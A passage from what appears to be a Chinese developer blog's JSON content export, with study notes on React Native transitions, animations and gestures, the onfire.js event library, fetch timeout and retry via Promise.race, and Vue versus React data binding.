translateX: &#123; from: SCREEN_WIDTH, to: 0, min: 0, max: 1, type: 'linear', extrapolate: true, round: PixelRatio.get() &#125;, opacity: &#123; from: 0, to: 1, min: 0.5, max: 1, type: 'linear', extrapolate: true, round: PixelRatio.get() &#125;, scale: &#123; value: 1, type: 'constant' &#125;&#125;;// 从左到右手势库const BaseLeftToRightGesture = &#123; // If the gesture can end and restart during one continuous touch isDetachable: false, // How far the swipe must drag to start transitioning gestureDetectMovement: 2, // Amplitude of release velocity that is considered still notMoving: 0.3, // Fraction of directional move required. directionRatio: 0.66, // Velocity to transition with when the gesture release was \"not moving\" snapVelocity: 2, // Region that can trigger swipe. iOS default is 30px from the left edge edgeHitWidth: 30, // Ratio of gesture completion when non-velocity release will cause action stillCompletionRatio: 3 / 5, fullDistance: SCREEN_WIDTH, direction: 'left-to-right'&#125;;const MyScene = &#123; // 你自定义的输出的动画名称 MyPushFromRight MyPushFromRight: &#123; // A list of all gestures that are enabled on this scene gestures: &#123; pop: BaseLeftToRightGesture &#125;, // Rebound spring parameters when transitioning FROM this scene springFriction: 26, springTension: 200, // Velocity to start at when transitioning without gesture defaultTransitionVelocity: 16, // Animation interpolators for horizontal transitioning: // 水平过渡动画插值： animationInterpolators: &#123; // 进入 into: buildStyleInterpolator(InFromRight), // 移出 out: buildStyleInterpolator(OutToLeft) &#125; &#125;&#125;;export default MyScene; 上述是笔者搞的一个横向无缩放滑动的过渡动画。如果满足你的需要，可以直接拿去用了。 下面以此为例简单说明一下，按接口的输出从后往前简述主要方法。 手势功能动画，用于定义 APP 中的手势，比如 IOS 中大幅的从左向右滑动会退回上一页面，这个只是简单说明，实际行为的配置在 BaseLeftToRightGesture 里，不再多述。 gestures 弹簧类动画的摩擦系数、弹性系数，用于微调动画结尾时的“弹性抖动”效果，自己试一下就有所体会。 springFrictionspringTension 动画插值配置，具体的动画实现就全在这里啦。 animationInterpolators 以OutToLeft为例，这是一个返回的过渡动画，效果是页面从左侧平行滑出，无缩放，透明度渐减。其中有translateX、opacity、scale等几个动画属性，看似和 CSS3 的动画很像。 对于不变的属性： 12value: 1, // 属性值，比如长度、透明度、放缩比例、角度等type: 'constant' // 类型是常量 对于变化属性： 1234567from: &#123;x: 0, y: 0, z: 0&#125;, // 初始值to: &#123;x: -SCREEN_WIDTH, y: 0, z: 0&#125;, // 终状态值min: 0, // 变化范围最小值max: 1, // 变化范围最大值type: 'linear', // 变化速度类型extrapolate: true, // 预判断round: PixelRatio.get() // 精确范围，eg.: PixelRatio.get() 精确到屏幕像素比倍数 目前源码中提到的动画属性有： 1234567transformTranslate // 3D 位移变化translateX // X 轴位移变化，类比 Y、Zopacity // 透明度scale // 放缩transformScale // 兼容性放缩scaleX // X 轴放缩比例，类比 YtransformRotateRadians // 旋转弧度 最后根据这里属性与官方的实例，就可以定制出你需要的动画效果。 注意到，源码的模块依赖： 1234567import &#123; Dimensions, I18nManager, PixelRatio,&#125; from 'react-native';var buildStyleInterpolator = require('./buildStyleInterpolator'); 如果是想把自定义动画的 js 文件放到外面，就需要安装：buildStyleInterpolator。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"前端 自定义事件调度","slug":"HTML5/前端自定义事件调度","date":"2017-08-24T15:51:08.000Z","updated":"2021-06-15T06:10:52.822Z","comments":true,"path":"/stories/2017/08/HTML5/前端自定义事件调度/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/HTML5/前端自定义事件调度/","excerpt":"前言在 Nodejs 里有一个非常好的事件模块：Events，很多的 api 的基于它来构建。在前端里，可以使用 createEvent 和 dispatchEvent 来自定义事件，但是这个 api 不好用，而且有兼容性问题。 取代它的是，可以使用onfire.js来自定义你事件。 onfire.js是一个很简单的事件分发的Javascript库（仅仅 0.9kb），简洁实用。 可用于： 简单的事件分发 在 react / vue.js / angular 用于跨组件的轻量级实现 事件订阅和发布","text":"前言在 Nodejs 里有一个非常好的事件模块：Events，很多的 api 的基于它来构建。在前端里，可以使用 createEvent 和 dispatchEvent 来自定义事件，但是这个 api 不好用，而且有兼容性问题。 取代它的是，可以使用onfire.js来自定义你事件。 onfire.js是一个很简单的事件分发的Javascript库（仅仅 0.9kb），简洁实用。 可用于： 简单的事件分发 在 react / vue.js / angular 用于跨组件的轻量级实现 事件订阅和发布 APIapi 就只有几个： on(event_name, callback, context) 绑定事件，参数为 event_name 和 callback， 当有名字为event_name的事件发生的时候，callback 方法将会被执行。这个方法会返回一个 eventObj，这个可以用于使用 un(eventObj) 方法来取消事件绑定。 one(event_name, callback, context) 绑定（订阅）事件，参数为 event_name with callbac，当被触发一次之后失效。只能被触发一次，一次之后自动失效。 fire(event_name, data1, data2, …) 异步方式触发名字为 event_name 的事件，并且赋予系列变量 datas 为 callback 方法的输入值。 fireSync(event_name, data1, data2, …) 同步的方式触发名字为 event_name 的事件，并且赋予系列变量 datas 为 callback 方法的输入值。阻塞。 un(eventObj / event_name) 取消事件绑定。可以仅仅取消绑定一个事件回调方法，也可以直接取消全部的事件。 clear() 清空所有事件。 基本使用安装： 1npm install onfire.js 或者使用 CDN：http://www.bootcdn.cn/onfire.js/ 简单使用： 12345678910111213141516171819import onfire from 'onfire.js';function test_callback(data1, data2) &#123; console.log('this is a event 1');&#125;// 绑定事件var eventObj = onfire.on('test_event', test_callback);var eventObj2 = onfire.on('test_event', function(data1, data2) &#123; console.log('this is a event 2');&#125;);// 触发事件onfire.fire('test_event', 'test_data1'， 'test_data2');// 取消绑定onfire.un(eventObj); // 取消绑定这个事件.onfire.un('test_event'); // 取消绑定所有的 `test_event`.onfire.un(test_callback); // 取消绑定所有的 `test_callback` 方法.","categories":[{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/categories/HTML5/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/tags/HTML5/"}]},{"title":"为 Fetch 添加超时连接和自动重连","slug":"HTML5/为 Fetch 添加超时连接和自动重连","date":"2017-08-24T01:09:08.000Z","updated":"2021-06-15T06:10:52.822Z","comments":true,"path":"/stories/2017/08/HTML5/为 Fetch 添加超时连接和自动重连/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/HTML5/为 Fetch 添加超时连接和自动重连/","excerpt":"FetchFetch是一个全新的 http 库，它不同与 ajax，Fetch 更加轻量与快捷。Fetch 没有超时连接的功能，下面记录着如何为 Fetch 添加超时连接与自动重连。","text":"FetchFetch是一个全新的 http 库，它不同与 ajax，Fetch 更加轻量与快捷。Fetch 没有超时连接的功能，下面记录着如何为 Fetch 添加超时连接与自动重连。 超时连接要知道，如果一个网络请求（http）默认连接时间是 30s，但是对于 Fetch 来说，就算是超过了 30s 也不会终止。这种情况下，我们可以自己做额外的操作，编写判断超时的函数，其实很简单，使用settimeout + promise。 Promise.all 与 Promise.racePromise.all是一个异步任务队列，它表示的是全部任务完成后才完成，只有一个失败就全部失败。Promise.race是一个异步任务队列，它表示的是最快的完成了就全部完成，只有一个失败了就全部失败。 Promise.race Promise.race 接收一个 promise 对象数组为参数 只要有一个 promise 对象进入 resolved 或者 rejected 状态的话，就会继续进行后面的处理 通俗讲就是多个 promise “比赛”，谁先跑出结果（成功或失败）就决策谁 先来看看两个竞争的 Promise： 1234567891011121314151617181920212223const task = () =&gt; &#123; let a = null; let b = null; const time1 = new Promise((resolve, reject) =&gt; &#123; a = () =&gt; reject('请求超时1'); &#125;); const time2 = new Promise((resolve, reject) =&gt; &#123; b = () =&gt; reject('请求超时2') &#125;); setTimeout(a, 1000); setTimeout(b, 2000); return Promise.race([time1, time2]);&#125;task().then(res =&gt; &#123; console.log(res);&#125;).catch(err =&gt; &#123; console.log(err);&#125;) 结果输出的是：请求超时1 假设，有一个 settimeout 任务与 fetch 任务，放到 Promise.race 里，那么就可以实现： 12345678910111213141516171819202122// 自定义const task = (fetch, timeout = 1000 * 10) =&gt; &#123; let a = null; const time1 = new Promise((resolve, reject) =&gt; &#123; a = () =&gt; reject('请求超时1'); &#125;); setTimeout(a, timeout); return Promise.race([time1, fetch]);&#125;// 使用task(fetch('https://zhuanlan.zhihu.com/api/columns/hesenbao')) .then(res =&gt; res.json()) .then(res =&gt; &#123; console.log(res); &#125;) .catch(err =&gt; &#123; console.error('Error', err); &#125;) 就这样实现 fetch 的超时控制。 自动重连当发生网络错误时或超时连接时，fetch 并不会重新连接，下面就为它添加自动重连。 1234567891011121314151617// 自动重连 3 次const again = async (fetch, number = 3) =&gt; &#123; let i = 0; while(i &lt; number) &#123; // 重连次数 try &#123; const res = await fetch(); return res; // 成功了 &#125; catch(err) &#123; console.error(err); i++; // 失败了 &#125; &#125; return Promise.reject('尝试多次仍然失败');&#125; 总结灵活使用 Promise 是实现功能的关键。","categories":[{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/categories/HTML5/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"网络请求","slug":"网络请求","permalink":"http://me.lizhooh.com/tags/网络请求/"},{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/tags/HTML5/"}]},{"title":"Vue 与 React 在更新数据上有什么不同？","slug":"Vue/Vue 与 React 在更新数据上有什么不同","date":"2017-08-21T02:28:47.000Z","updated":"2021-06-15T06:10:52.899Z","comments":true,"path":"/stories/2017/08/Vue/Vue 与 React 在更新数据上有什么不同/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/Vue/Vue 与 React 在更新数据上有什么不同/","excerpt":"前言Vue 与 React 是两个不同的框架，它们在数据更新上采用了不同的方式。 React 更新数据React 并没有实现数据的双向绑定，React 更新数据是通过this.setState来更新数据的，每次使用 this.setState 都会根据 VDOM 与 DOM 去计算 DIFF，最后得出需要更新的节点，并去更新它。","text":"前言Vue 与 React 是两个不同的框架，它们在数据更新上采用了不同的方式。 React 更新数据React 并没有实现数据的双向绑定，React 更新数据是通过this.setState来更新数据的，每次使用 this.setState 都会根据 VDOM 与 DOM 去计算 DIFF，最后得出需要更新的节点，并去更新它。 Vue 数据双向绑定原理Vue 实现了双向数据绑定（MVVM），那么它是如何实现的？ 123date() &#123; return &#123; a: 1 &#125;&#125; 通过控制台查看数据后发现每个数据后 Vue 都会为你添加 get, set 方法。因为 Vue 是通过Object.defineProperty()来实现数据劫持的。 再来看看 Object.defineProperty()： Object.defineProperty(obj, prop, descriptor) Object.defineProperty() 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性， 并返回这个对象。 obj: 需要被操作的目标对象 prop: 目标对象需要定义或修改的属性的名称 descriptor: 将被定义或修改的属性的描述符 return: 被传递给函数的对象 使用 Object.defineProperty 轻易实现数据的双向绑定： 12345678910111213141516var obj = &#123;&#125;;var name = '小明'Object.defineProperty(obj, 'name', &#123; get: function() &#123; console.log('get'); return name; &#125;, set: function(newValue) &#123; console.log('set'); name = newValue; &#125;&#125;);obj.name = '小美';obj.name; 上面的代码表明，当我使用obj.name时，就会进入 get 函数里，当我使用obj.name = &#39;xa&#39;时，就会进入 set 函数里。 因此，利用这种特性，就可以轻易的实现数据对象与 DOM 对象的双向绑定： 12345678910var obj = &#123;&#125;;Object.defineProperty(obj, 'name', &#123; get: function() &#123; return document.getElementById('name').innerText; &#125;, set: function(newValue) &#123; document.getElementById('name').innerText = newValue; &#125;&#125;); 到这里，Vue 是如何实现数据的双向绑定，这个问题已经非常明了：Vue 数据双向绑定是通过数据劫持结合发布者-订阅者模式的方式来实现的。 MVVM 分析实现 MVVM 主要包含两个方面，数据变化更新视图，视图变化更新数据： 使用 Object.defineProperty 为数据项添加 get, set 函数来实现数据的双向绑定。但是这种绑定是有延迟的，为什么这么说？看 get 部分，只有触发 get 才会取到最新的值，对此没什么影响。 实现的过程大概如下： 实现一个监听器 Observer，用来劫持并监听所有属性，如果有变动的，就通知订阅者。 实现一个订阅者 Watcher，可以收到属性的变化通知并执行相应的函数，从而更新视图。 实现一个解析器 Compile，可以扫描和解析每个节点的相关指令，并根据初始化模板数据以及初始化相应的订阅器。 注：Vue 2.0+ 也加入了 VDOM 与 DIFF。 参考资料 http://web.jobbole.com/84301/http://www.cnblogs.com/libin-1/p/6893712.html","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"React Native 动画详解","slug":"React Native/Animated/React Native 动画详解","date":"2017-08-18T02:26:30.000Z","updated":"2021-06-15T06:10:52.853Z","comments":true,"path":"/stories/2017/08/React Native/Animated/React Native 动画详解/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/React Native/Animated/React Native 动画详解/","excerpt":"前言在 React Native 里动画是一个比较重要的 API，往往一个 App 是否好，很多取决于有没有良好的交互性动画。 AnimatedAnimated 是用于创建更精细的交互控制的动画 API。它的特点有： 容易实现各种动画和交互 具备极高的性能 仅关注动画的输入和输出声明 配置是声明式的，序列化好配置，可在高优先级的线程执行动画 动画的顺序执行由 start/stop 方法来控制","text":"前言在 React Native 里动画是一个比较重要的 API，往往一个 App 是否好，很多取决于有没有良好的交互性动画。 AnimatedAnimated 是用于创建更精细的交互控制的动画 API。它的特点有： 容易实现各种动画和交互 具备极高的性能 仅关注动画的输入和输出声明 配置是声明式的，序列化好配置，可在高优先级的线程执行动画 动画的顺序执行由 start/stop 方法来控制 创建动画组件原生支持的组件类型：View，Text，Image，将其他组件转换为 Animated 组件：createAnimatedComponent 1const AnimatedScrollView = Animated.createAnimatedComponent(ScrollView); 核心 APIAnimated 提供了三个动画组件，分别是 Animated.View，Animated.Text，Animated.Image 而对于动画类型又分为 2 个： 值类型 动画类型 值类型值类型分为 2 个： Value：用于单个值 new Animated.Value(0): 可以作为属性传递给动画组件，但属性只能收取基本类型的值 setVAlue: new Animated.Value() 实例上的方法，允许外部代码控制实例内部的值并且不触发中间状态的动画，如果中间使用了插值计算则会得到正确的值但依然不会触发动画 interpolate: 插值计算时使用（注意其中的 inputRange 必须是升序） clamp: 不会超过边界值 identity: 超过边界值后直接变为input的值 extend(default): 会超过边界值 注意用插值进行颜色转换时对 hex 没用，只对rgb, rgba, hsl 和其他数字格式。 插值还可以进行角度转换比如 outputRange [0deg, 15deg]，也可运用outputRange: [0rad, 0.0872665rad]，1 弧度大概等于 57.2958 度。12345this.opacityAnimation = this.animatedValue.x.interpolate(&#123; inputRange: [0, 150], outputRange: [1, .2], extrapolate: 'clamp'&#125;); addListener: 动画是异步的，但可以通过此方法监听动画值的改变，但记得不使用时 remove removeListener: 取消监听，传入的参数是 addListener 返回的 string removeAllListeners: 取消所有监听 stopAnimation: 终止动画，回调里面有当前动画停止时的值 ValueXY：用于向量值，一般要处理位置或者手势时使用 new Animated.ValueXY(): 初始值是 {x: 0, y: 0} getLayout: 将{x, y}转换为{left, top}以便用于 style，当使用这个方法时，组件的 position 必须为 absolute getTranslateTransform: 将一个{x, y}组合转换为一个可用的位移变换(translation transform), 不必关心其现在的布局 setOffset: 在设定的值上的偏移 flattenOffset: 获取 offset 内的值并将它加到 animated value 的 base 上然后重置 offset 为 0 动画类型动画类型主要针对的是一些自带的动画效果。 spring(friction: 摩擦力{7}, tension: 张力{40}): 基础的单次弹跳物理模型 decay(velocity: 起始速度, deceleration: 速度衰减比例{0.997}): 以一个初始速度开始并且逐渐减慢停止，此部分与 PanResponder 很好结合 12345this.animatedValue = new Animated.ValueXY();Animated.decay(this.animatedValue, &#123; // 逐渐停止 velocity: &#123;x: gestureState.vx, y: gestureState.vy&#125;, // 手势释放速度 deceleration: 0.997, // 速度衰减比例&#125;) timing(duration: 动画持续时间{500毫秒}, easing: 渐变函数，delay: 延迟开始动画{0}): 时间范围映射到渐变的值 easing 可以选择的值 动画过程 动画开始: 调用 start 方法(里面允许回调，因此可以实现循环动画，这里使用了 interpolate 实际只有一个变量) 12345678910rotateTime = () =&gt; &#123; this.animatedValue.setValue(&#123;x:0, y:0&#125;); this.ani = Animated.timing(this.animatedValue, &#123; toValue: 360, duration: 1500, easing: Easing.linear &#125;).start(event =&gt; this.rotateTime());&#125;settimeout(() =&gt; this.ani.stop(), 3000); // 停止 动画正常结束: 回调函数调用时的参数为 {finished: true} 动画正常结束之前调用 stop 结束: 回调函数调用时的参数为 {finished: false} 组合动画组合动画分为几个类型： parallel （同时执行） sequence （顺序执行） stagger （错峰执行） delay （延迟执行） 注意：默认情况下，如果任何一个动画被停止或中断了，组内所有其它的动画也会被停止。Parallel 有一个 stopTogether 属性，如果设置为 false，可以禁用自动停止。 123456789101112131415161718this.opacityAnimationValue = new Animated.Value(1);this.moveAnimationValue = new Animated.ValueXY(); // 默认 &#123;x: 0, y: 0&#125;// 顺序执行，先移动再逐渐变透明Animated.sequence([ Animated.timing(this.moveAnimationValue, &#123; toValue: 100, duration: 500 &#125;), Animated.timing(this.opacityAnimationValue, &#123; toValue: 0, duration: 200 &#125;)]).start()// ...&lt;Animated.View style=&#123;&#123; opacity: this.opacityAnimationValue, transform: this.moveAnimationValue.getTranslateTransform()&#125;&#125;/&gt; 更复杂的： 123456789101112131415Animated.sequence([ // 首先执行 decay 动画，结束后同时执行 spring 和 twirl 动画 Animated.decay(position, &#123; // 滑行一段距离后停止 // 根据用户的手势设置速度 velocity: &#123;x: gestureState.vx, y: gestureState.vy&#125;, deceleration: 0.997, &#125;), Animated.parallel([ // 在 decay 之后并行执行： Animated.spring(position, &#123; toValue: &#123;x: 0, y: 0&#125; // 返回到起始点开始 &#125;), Animated.timing(twirl, &#123; // 同时开始旋转 toValue: 360, &#125;), ]),]).start(); // 执行这一整套动画序列 动画事件 允许手势或其他事件直接绑定到动态值上 结构化的映射语法，使得复杂事件对象中的值被正确的解开 1234567onScroll = &#123;Animated.event( // scrollX = e.nativeEvent.contentOffset.x [&#123; nativeEvent: &#123; contentOffset: &#123; x: scrollX &#125; &#125; &#125;])&#125;onPanResponderMove = &#123;Animated.event([ null, // 忽略原生事件 &#123; dx: pan.x, dy: pan.y &#125; // 从 gestureState 中解析出 dx 和 dy 的值])&#125;; Animated 结合 PanResponder下面的示例是 Animated 结合 PanResponder 实现，手势动画的变化： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import React, &#123; Component &#125; from 'react';import &#123; StyleSheet, View, Text, PanResponder, Animated, Dimensions&#125; from 'react-native';const window = Dimensions.get('window');export default class touch extends Component &#123; constructor(props) &#123; super(props); // 创建动画值 this.value = &#123; x: 0, y: 0 &#125;; this.animatedValue = new Animated.ValueXY(this.value); // 监听动画值变化 this.animatedValue.addListener(value =&gt; this.value = value); this.panResponder = PanResponder.create(&#123; onStartShouldSetPanResponder: () =&gt; true, onMoveShouldSetPanResponder: () =&gt; true, onPanResponderGrant: () =&gt; &#123; // 初始化 this.animatedValue.setValue(&#123; x: 0, y: 0 &#125;); &#125;, // 事件映射 onPanResponderMove: Animated.event([ null, &#123; dx: this.animatedValue.x, dy: this.animatedValue.y &#125; ], &#123; listener: this.onScroll &#125;), onPanResponderRelease: () =&gt; &#123; // 复位动画 Animated.spring(this.animatedValue, &#123; toValue: 0, tension: 80 &#125;).start(); &#125;, // onPanResponderTerminate: this.onPanResponderRelease, &#125;); &#125; // 颜色动画，在 Y 轴方向上 interpolatedColorAnimation = () =&gt; this.animatedValue.y.interpolate(&#123; inputRange: [0, window.height], outputRange: ['rgba(225, 0, 0, 1)', 'rgba(0, 255, 0, 1)'], extrapolate: 'clamp' &#125;); // 旋转动画，在 X 轴方向上 interpolatedRotateAnimation = () =&gt; this.animatedValue.x.interpolate(&#123; // 在 X 轴 0 时，为 -360deg，在中间时为 0 deg inputRange: [0, window.width / 2, window.width], outputRange: ['-360deg', '0deg', '360deg'] &#125;); render() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;Animated.View style=&#123;[ styles.box, &#123; transform: [ &#123; translateX: this.animatedValue.x &#125;, &#123; translateY: this.animatedValue.y &#125;, &#123; rotate: interpolatedRotateAnimation() &#125; ], backgroundColor: interpolatedColorAnimation() &#125; ]&#125; &#123;...this.panResponder.panHandlers&#125; /&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, &#125;, box: &#123; width: 100, height: 100 &#125;&#125;); 它的效果看起来像是这样（是 gif 录制卡）： LayoutAnimation这里不说了，之前写过一篇：React Native LayoutAnimation 参考资料 http://reactnative.cn/docs/next/animations.html#content https://race604.com/react-native-touch-event/","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 手势详解","slug":"React Native/React Native 手势详解","date":"2017-08-17T15:04:20.000Z","updated":"2021-06-15T06:10:52.863Z","comments":true,"path":"/stories/2017/08/React Native/React Native 手势详解/","link":"","permalink":"http://me.lizhooh.com/stories/2017/08/React Native/React Native 手势详解/","excerpt":"前言在移动应用开发中，触摸和动画是不可忽视的两个方面。React-Native 针对手势处理，提供了几组 API，为基本的点击手势和复杂的滑动等都提供了相应的解决方案。对于动画，React Native 提供了 Animated 的 API，是一种高性能的 Javascript 实现。","text":"前言在移动应用开发中，触摸和动画是不可忽视的两个方面。React-Native 针对手势处理，提供了几组 API，为基本的点击手势和复杂的滑动等都提供了相应的解决方案。对于动画，React Native 提供了 Animated 的 API，是一种高性能的 Javascript 实现。 手势事件在响应手势里，responder（响应器）是响应手势的基本单位。具体来说，就是 view 组件，任何一个 view 组件都是一个潜在的 responder。在一个 React Native 应用中只能存在一个 responder，也就是只能响应一个手势。 responder 如何响应手势操作： 激活某个responder由 onStartShouldSetResponder（启动时应设置应答器） 以及 onMoveShouldSetResponder（移动时应设置应答器）两个方法来操作，当用户通过触摸或者滑动来开始事件时，上面两个方法需要返回 true，如果返回 false，事件将不触发。 如果组件被激活，此时 onResponderGrant 方法被调用。为了良好的反馈，此时最好去改变组件的颜色或者透明度来提示用户此组件被激活了。[构造] 用户滑动手指，onResponderMove 方法被调用。[活动] 用户的手指离开屏幕，onResponderRelease 方法被调用，此时组件其自身样式复原以提示操作完成。[释放] 到现在为止，整个流程为: 响应 touch 或者 move 手势 -&gt; grant 被激活 -&gt; move -&gt; release。 在上述的几个方法中，都提供了一个参数 even xt，event 是一个 touch 事件，其下面的 nativeEvent 是一个对象，里面记录的信息对于进行复杂手势的合成相当有用。具体而言它主要提供了下述信息： changedTouches: 一个数组保存着自上次事件后所有有变化的 touch 事件 identifier: touch 的 ID locationX: 相对于当前元素的 touch 的X位置 locationY: 相对于当前元素的 touch 的Y位置 pageX: 相对于根元素的 touch 的X位置 pageY: 相对于根元素的 touch 的Y位置 target: 接受 touch 事件的元素的节点id timestamp: touch 的时间标示 touches: 一个数组保存着现在屏幕上的所有 touch 下面是示例代码，根据手势来移动方块： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102import React, &#123; Component &#125; from 'react';import &#123; StyleSheet, View, Text,&#125; from 'react-native';export default class App extends Component &#123; constructor(props) &#123; super(props); this.config = &#123; changeX: 0, changeY: 0, xDiff: 0, yDiff: 0 &#125;; this.state = &#123; bg: 'white', left: 0, top: 0 &#125;; this.gestureHandlers = &#123; // 启动时应设置应答器 onStartShouldSetResponder: (&#123; nativeEvent &#125;) =&gt; &#123; console.log(nativeEvent); console.log(\"start\"); return true; &#125;, // 移动时应设置应答器 onMoveShouldSetResponder: (&#123; nativeEvent &#125;) =&gt; &#123; console.log(\"move begin\"); return true; &#125;, // 开始触发手势 （开始） onResponderGrant: (&#123; nativeEvent &#125;) =&gt; &#123; console.log(\"grant\"); // 改变的值 this.config.changeX = nativeEvent.pageX; this.config.changeY = nativeEvent.pageY; this.setState(&#123; bg: 'red' &#125;); &#125;, // 手势触摸移动（正在进行） onResponderMove: (&#123; nativeEvent &#125;) =&gt; &#123; console.log(\"moving\"); // 差值 this.config.xDiff = nativeEvent.pageX - this.config.changeX; this.config.yDiff = nativeEvent.pageY - this.config.changeY; // 初始位置 + 差值 = 新的位置 const left = this.state.left + this.config.xDiff; const top = this.state.top + this.config.yDiff; // 更新 this.config.changeY = nativeEvent.pageY; this.config.changeX = nativeEvent.pageX; this.setState(&#123; left, top &#125;); &#125;, // 手势释放（结束） onResponderRelease: (&#123; nativeEvent &#125;) =&gt; &#123; console.log(\"release\"); this.setState(&#123; bg: 'white' &#125;); &#125; &#125; &#125; render() &#123; console.log(\"begin render\"); return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;Text&gt;Begin&lt;/Text&gt; &lt;View // 使用手势 &#123;...this.gestureHandlers&#125; style=&#123;[styles.rect, &#123; backgroundColor: this.state.bg, transform: [ &#123; translateX: this.state.left &#125;, &#123; translateY: this.state.top &#125; ] &#125;]&#125; /&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#F5FCFF', &#125;, rect: &#123; width: 100, height: 100, borderWidth: 1, borderColor: 'black', position: 'absolute', &#125;&#125;); 它的效果看起来像是这样（是 gif 录制卡）： PanResponderPanResponder 是 React Native 提供的一套抽象方法，和 gesture responder system 比起来，其抽象程度更高，使用起来更加方便。PanResponder 类可以将多点触摸操作协调成一个手势。它使得一个单点触摸可以接受更多的触摸操作，也可以用于识别简单的多点触摸手势。具体的说它在基本的 event 参数之外，还提供了另外一个参数 gestureState，gestureState 是一个对象，包含了以下信息： stateID: gestureState 的 ID，在屏幕上保持至少一个触发动作的时间 moveX: 最近动态触发的最新的屏幕坐标 x0: 应答器横向的屏幕坐标 y0: 应答器纵向的屏幕坐标 dx: 触发开始后累积的横向动作距离 dy: 触发开始后累积的纵向动作距离 vx: 当前手势的纵向速度 vy: 当前手势的纵向速度 numberActiveTouch: numberActiveTouch 下面实现的是一个类似根据手势进行，放缩图片的示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import React, &#123; Component &#125; from 'react';import &#123; AppRegistry, StyleSheet, Text, View, Image, PanResponder,&#125; from 'react-native';export default class touch extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; bg: 'red', distant: 150, &#125; &#125; gestureHandlers = PanResponder.create(&#123; onStartShouldSetPanResponder: (e, gestureState) =&gt; &#123; console.log(\"start\", gestureState.numberActiveTouches); return gestureState.numberActiveTouches === 2; &#125;, onMoveShouldSetPanResponder: (e, gestureState) =&gt; &#123; console.log(\"move start\", gestureState.numberActiveTouches); return gestureState.numberActiveTouches === 2; &#125;, onPanResponderGrant: (&#123; nativeEvent: &#123; touches &#125; &#125;, gestureState) =&gt; &#123; console.log(\"grant\", gestureState.numberActiveTouches); if (gestureState.numberActiveTouches === 2) &#123; this.setState(&#123; bg: 'orange' &#125;); const dx = Math.abs(touches[0].pageX - touches[1].pageX); const dy = Math.abs(touches[0].pageY - touches[1].pageY); this.distant = Math.sqrt(dx * dx + dy * dy); // 两个触发点的距离 this._distant = this.state.distant; // 缓存当前放缩量 &#125; &#125;, onPanResponderMove: (&#123; nativeEvent: &#123; touches &#125; &#125;, gestureState) =&gt; &#123; // 计算放缩值 console.log(gestureState.numberActiveTouches + \" \" + touches.length); if (gestureState.numberActiveTouches === 2) &#123; this.setState(&#123; bg: 'orange' &#125;); const dx = Math.abs(touches[0].pageX - touches[1].pageX); const dy = Math.abs(touches[0].pageY - touches[1].pageY); const distant = Math.sqrt(dx * dx + dy * dy); this.setState(&#123; distant: this._distant + (distant - this.distant) &#125;); &#125; &#125;, onPanResponderRelease: (e, gestureState) =&gt; &#123; this.setState(&#123; bg: 'red' &#125;); console.log(gestureState); &#125;, // onPanResponderTerminate: this.onPanResponderRelease, &#125;) render() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;View &#123;...this.gestureHandlers.panHandlers&#125; style=&#123;[styles.rectBig, &#123; backgroundColor: this.state.bg, // 1 / 150 是放缩速度，代表 1px 放缩 1 / 150 倍 transform: [&#123; scale: this.state.distant / 150 &#125;] &#125;]&#125;&gt; &lt;/View&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#F5FCFF', &#125;, rectBig: &#123; width: 200, height: 200, justifyContent: 'center', alignItems: 'center', &#125;&#125;); 它的效果看起来像是这样（是 gif 录制卡）： 上面代码里： 在 onStartShouldSetPanResponder 方法里我们判断了激活的 touches 的数量，我们希望 Zoom 